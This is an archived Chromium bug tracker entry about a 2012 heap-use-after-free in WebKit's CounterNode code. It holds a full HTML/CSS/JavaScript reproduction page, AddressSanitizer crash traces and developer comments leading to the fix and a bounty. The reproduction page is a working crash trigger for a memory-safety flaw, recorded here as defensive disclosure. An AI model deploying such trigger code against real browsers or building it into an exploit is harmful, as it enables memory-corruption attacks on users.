# Heap-use-after-free in WebCore::CounterNode::lastDescendant

| Field | Value |
|-------|-------|
| **Issue ID** | [40058825](https://issues.chromium.org/issues/40058825) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2012-05-26 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::CounterNode::lastDescendant()

**VERSION**  

Chrome Version: dev, stable,

Chromium 21.0.1152.0 (Developer Build 139183)  

OS Linux  

WebKit 537.1 (@118560)  

JavaScript V8 3.11.6.2

Operating System: 64bit precise

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0::after {
content: counter(c);
counter-increment: c;
}
#el1 {
content: counter(c);
counter-increment: c;
}
#el2 {
content: counter(c);
counter-increment: c;
}
#el2::after {
content: counter(c);
}
#el3 {
position: absolute;
}
#el3::before {
content: counter(c);
counter-reset: c;
}
#el3:after {
content: counter(c);
counter-reset: c;
}
#el4 {
counter-increment: c;
}
#el5 {
content: counter(c);
counter-increment: c;
}
</style>
<script>
onload = function() {
el0=document.createElement('span')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
el1=document.createElement('div')
el1.setAttribute('id', 'el1')
el0.appendChild(el1)
el2=document.createElement('div')
el2.setAttribute('id', 'el2')
el0.appendChild(el2)
el3=document.createElement('div')
el3.setAttribute('id','el3')
el2.appendChild(el3)
el4=document.createElement('span')
el4.setAttribute('id','el4')
el2.appendChild(el4)
el5=document.createElement('div')
el5.setAttribute('id', 'el5')
el0.appendChild(el5)
document.body.offsetTop
document.styleSheets[0].insertRule("#el2::after { counter-increment: c; } ", document.styleSheets[0].length)
document.body.offsetTop
document.styleSheets[0].insertRule("xyz { } ", document.styleSheets[0].length)
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==32268== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffecb1afc0 at pc 0x55555b221825 bp 0x7fffffff8300 sp 0x7fffffff82f8  

READ of size 8 at 0x7fffecb1afc0 thread T0  

#0 0x55555b221825 in WebCore::CounterNode::lastDescendant() const ???:0  

#1 0x55555b20b7f1 in WebCore::destroyCounterNodeWithoutMapRemoval(WTF::AtomicString const&, WebCore::CounterNode\*) third\_party/WebKit/Source/WebCore/rendering/RenderCounter.cpp:0

0x7fffecb1afc0 is located 64 bytes inside of 72-byte region [0x7fffecb1af80,0x7fffecb1afc8)  

freed by thread T0 here:  

#0 0x55555e5577e2 in free ??:0  

#1 0x55555b20eab5 in void WTF::deleteOwnedPtr<WTF::HashMap<WTF::RefPtr[WTF::AtomicStringImpl](javascript:void(0);), WTF::RefPtr[WebCore::CounterNode](javascript:void(0);), WTF::PtrHash<WTF::RefPtr[WTF::AtomicStringImpl](javascript:void(0);) >, WTF::HashTraits<WTF::RefPtr[WTF::AtomicStringImpl](javascript:void(0);) >, WTF::HashTraits<WTF::RefPtr[WebCore::CounterNode](javascript:void(0);) > > >(WTF::HashMap<WTF::RefPtr[WTF::AtomicStringImpl](javascript:void(0);), WTF::RefPtr[WebCore::CounterNode](javascript:void(0);), WTF::PtrHash<WTF::RefPtr[WTF::AtomicStringImpl](javascript:void(0);) >, WTF::HashTraits<WTF::RefPtr[WTF::AtomicStringImpl](javascript:void(0);) >, WTF::HashTraits<WTF::RefPtr[WebCore::CounterNode](javascript:void(0);) > >\*) ???:0  

#2 0x55555b20b561 in WebCore::RenderCounter::destroyCounterNodes(WebCore::RenderObject\*) ???:0  

#3 0x55555b20c123 in WebCore::RenderCounter::rendererRemovedFromTree(WebCore::RenderObject\*) ???:0  

#4 0x55555b09f8cf in WebCore::RenderObjectChildList::removeChildNode(WebCore::RenderObject\*, WebCore::RenderObject\*, bool) ???:0

## Attachments

- [6472.html](attachments/6472.html) (text/html; charset=us-ascii, 1.7 KB)
- [6472.txt](attachments/6472.txt) (text/x-c; charset=us-ascii, 11.0 KB)
- [stable-6472.txt](attachments/stable-6472.txt) (text/x-c; charset=us-ascii, 10.6 KB)

## Timeline

### in...@chromium.org (2012-05-27)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=51567635

Uploader: jschuh@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f947aea8bc0
Crash State:
  - crash stack -
  WebCore::CounterNode::lastDescendant
  WebCore::destroyCounterNodeWithoutMapRemoval
  - free stack -
  void WTF::deleteOwnedPtr<WTF::HashMap<WTF::RefPtr<WTF::AtomicStringImpl>, WTF::RefPtr<WebCore::Count
  WebCore::RenderCounter::destroyCounterNodes
  

Minimized Testcase (1.62 Kb): https://cluster-fuzz.appspot.com/download/AMIfv96kQ6stst4hW3K-B5tfI3o1YcG29qNhmVMgeGP95s1BPBtT-YYRvHkeOglgqVTg5PcPidTiGz6oVTiQsEkxWGsVvmNjYoocm0AK9Lb-jzwVDfsYIv5PktDT1Nuou9zRUDNJtsy_IaVAtfr7mJJGmFSBAM6uag

### in...@chromium.org (2012-05-27)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-27)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-27)

This is a CounterNode map issue and not RenderCounter issue. The CounterNode maintains raw pointers to its parent, next, previous, first child and last siblings. and once tree goes into a bad state, its cannot track the frees. 

### js...@chromium.org (2012-05-27)

I think @cdn might want to take a look at this. He was under the impression that we couldn't get this kind of counter tree corruption anymore.

### [Deleted User] (2012-05-28)

I'll take a look. The stack trace looks all too familiar.

### in...@chromium.org (2012-05-29)

[Empty comment from Monorail migration]

### [Deleted User] (2012-06-01)

filed upstream as https://bugs.webkit.org/show_bug.cgi?id=88142

### sc...@gmail.com (2012-06-20)

Committed r120801: <http://trac.webkit.org/changeset/120801>

Good perseverence from cdn :)

### sc...@gmail.com (2012-06-22)

$1000

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-09)

M20: http://trac.webkit.org/changeset/122122
M21: http://trac.webkit.org/changeset/122123

### sc...@gmail.com (2012-07-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/129898?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058825)*
